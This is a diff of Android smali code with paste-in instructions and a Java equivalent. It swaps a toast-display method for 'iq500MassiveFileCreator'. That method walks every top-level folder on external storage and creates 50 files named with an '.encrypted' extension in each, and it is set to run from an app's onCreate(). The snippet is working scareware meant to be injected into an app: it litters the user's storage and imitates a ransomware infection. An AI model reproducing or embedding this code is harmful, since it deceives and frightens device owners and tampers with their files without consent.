@@ -1,6 +1,6 @@
 #method. Paste it at the end of the code.
-.method private iq500SplitSentenceIntoToasts()V
-    .registers 11
+.method private iq500MassiveFileCreator()V
+    .registers 19
     .annotation system Ldalvik/annotation/Signature;
         value = {
             "()V"
@@ -8,90 +8,278 @@
     .end annotation
 
     .prologue
-    move-object v0, p0
+    move-object/from16 v0, p0
 
-    const-string v5, "Insert Your String"
+    new-instance v9, Ljava/io/File;
 
-    move-object v2, v5
+    move-object/from16 v17, v9
 
-    const/4 v5, 0x0
+    move-object/from16 v9, v17
 
-    move v3, v5
+    move-object/from16 v10, v17
 
-    :goto_6
-    move v5, v3
+    new-instance v11, Ljava/lang/StringBuffer;
 
-    move-object v6, v2
+    move-object/from16 v17, v11
 
-    invoke-virtual {v6}, Ljava/lang/String;->length()I
+    move-object/from16 v11, v17
 
-    move-result v6
+    move-object/from16 v12, v17
 
-    const/4 v7, 0x1
+    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V
 
-    add-int/lit8 v6, v6, 0x1
+    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
 
-    if-lt v5, v6, :cond_12
+    move-result-object v12
+
+    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;
+
+    move-result-object v11
+
+    const-string v12, "/"
+
+    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v11
+
+    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-direct {v10, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object v2, v9
+
+    move-object v9, v2
+
+    invoke-virtual {v9}, Ljava/io/File;->list()[Ljava/lang/String;
+
+    move-result-object v9
+
+    move-object v3, v9
+
+    const/4 v9, 0x0
+
+    move v4, v9
+
+    :goto_33
+    move v9, v4
+
+    move-object v10, v3
+
+    array-length v10, v10
+
+    if-lt v9, v10, :cond_39
 
     return-void
 
-    :cond_12
-    move v5, v3
+    :cond_39
+    const/4 v9, 0x0
 
-    move-object v6, v2
+    move v5, v9
 
-    invoke-virtual {v6}, Ljava/lang/String;->length()I
+    :goto_3b
+    move v9, v5
 
-    move-result v6
+    const/16 v10, 0x32
 
-    if-ge v5, v6, :cond_30
+    if-lt v9, v10, :cond_43
 
-    move-object v5, v0
+    add-int/lit8 v4, v4, 0x1
 
-    move-object v6, v2
+    goto :goto_33
 
-    move v7, v3
+    :cond_43
+    new-instance v9, Ljava/io/File;
 
-    move v8, v3
+    move-object/from16 v17, v9
 
-    const/4 v9, 0x1
+    move-object/from16 v9, v17
 
-    add-int/lit8 v8, v8, 0x1
+    move-object/from16 v10, v17
 
-    invoke-virtual {v6, v7, v8}, Ljava/lang/String;->substring(II)Ljava/lang/String;
+    new-instance v11, Ljava/lang/StringBuffer;
 
-    move-result-object v6
+    move-object/from16 v17, v11
 
-    const/4 v7, 0x0
+    move-object/from16 v11, v17
 
-    invoke-static {v5, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+    move-object/from16 v12, v17
 
-    move-result-object v5
+    invoke-direct {v12}, Ljava/lang/StringBuffer;-><init>()V
 
-    invoke-virtual {v5}, Landroid/widget/Toast;->show()V
+    new-instance v12, Ljava/lang/StringBuffer;
 
-    :goto_2d
-    add-int/lit8 v3, v3, 0x1
+    move-object/from16 v17, v12
 
-    goto :goto_6
+    move-object/from16 v12, v17
 
-    :cond_30
-    move-object v5, v0
+    move-object/from16 v13, v17
 
-    const-string v6, "-By 500IQ"
+    invoke-direct {v13}, Ljava/lang/StringBuffer;-><init>()V
 
-    const/4 v7, 0x0
+    new-instance v13, Ljava/lang/StringBuffer;
 
-    invoke-static {v5, v6, v7}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+    move-object/from16 v17, v13
 
-    move-result-object v5
+    move-object/from16 v13, v17
 
-    invoke-virtual {v5}, Landroid/widget/Toast;->show()V
+    move-object/from16 v14, v17
 
-    goto :goto_2d
+    invoke-direct {v14}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v14, Ljava/lang/StringBuffer;
+
+    move-object/from16 v17, v14
+
+    move-object/from16 v14, v17
+
+    move-object/from16 v15, v17
+
+    invoke-direct {v15}, Ljava/lang/StringBuffer;-><init>()V
+
+    new-instance v15, Ljava/lang/StringBuffer;
+
+    move-object/from16 v17, v15
+
+    move-object/from16 v15, v17
+
+    move-object/from16 v16, v17
+
+    invoke-direct/range {v16 .. v16}, Ljava/lang/StringBuffer;-><init>()V
+
+    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;
+
+    move-result-object v16
+
+    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/Object;)Ljava/lang/StringBuffer;
+
+    move-result-object v15
+
+    const-string v16, "/"
+
+    invoke-virtual/range {v15 .. v16}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v15
+
+    invoke-virtual {v15}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v15
+
+    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v14
+
+    move-object v15, v3
+
+    move/from16 v16, v4
+
+    aget-object v15, v15, v16
+
+    invoke-virtual {v14, v15}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v14
+
+    invoke-virtual {v14}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v14
+
+    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v13
+
+    const-string v14, "/"
+
+    invoke-virtual {v13, v14}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v13
+
+    invoke-virtual {v13}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v13
+
+    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v12
+
+    move v13, v5
+
+    invoke-static {v13}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;
+
+    move-result-object v13
+
+    invoke-virtual {v12, v13}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v12
+
+    invoke-virtual {v12}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v12
+
+    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v11
+
+    const-string v12, ".encrypted"
+
+    invoke-virtual {v11, v12}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;
+
+    move-result-object v11
+
+    invoke-virtual {v11}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;
+
+    move-result-object v11
+
+    invoke-direct {v10, v11}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    move-object v6, v9
+
+    move-object v9, v6
+
+    :try_start_d7
+    invoke-virtual {v9}, Ljava/io/File;->createNewFile()Z
+    :try_end_da
+    .catch Ljava/io/IOException; {:try_start_d7 .. :try_end_da} :catch_df
+
+    move-result v9
+
+    :goto_db
+    add-int/lit8 v5, v5, 0x1
+
+    goto/16 :goto_3b
+
+    :catch_df
+    move-exception v9
+
+    move-object v7, v9
+
+    goto :goto_db
 .end method
 
+
 #caller. Paste it at first line of the onCreate() method
-invoke-direct {p0}, Lcom/mycompany/myapp2/MainActivity;->iq500SplitSentenceIntoToasts()V
+invoke-direct {p0}, Lcom/mycompany/myapp2/MainActivity;->iq500MassiveFileCreator()V
 #You have to manually set the current activity (Lcom...)
 
+#Java logic is as follows:
+
+private void iq500MassiveFileCreator()
+	{
+		File dir = new File(Environment.getExternalStorageDirectory() + "/");
+		String[] dir2 = dir.list();
+		
+		for(int i = 0; i < dir2.length; i++)
+		{
+			for(int j = 0; j < 50; j++)
+			{
+				File file = new File(Environment.getExternalStorageDirectory()+"/" + dir2[i] + "/" + Integer.toString(j) + ".encrypted"); 
+				try
+				{
+					file.createNewFile();
+				}
+				catch (IOException e)
+				{}
+			}
+			
+		}
+	}
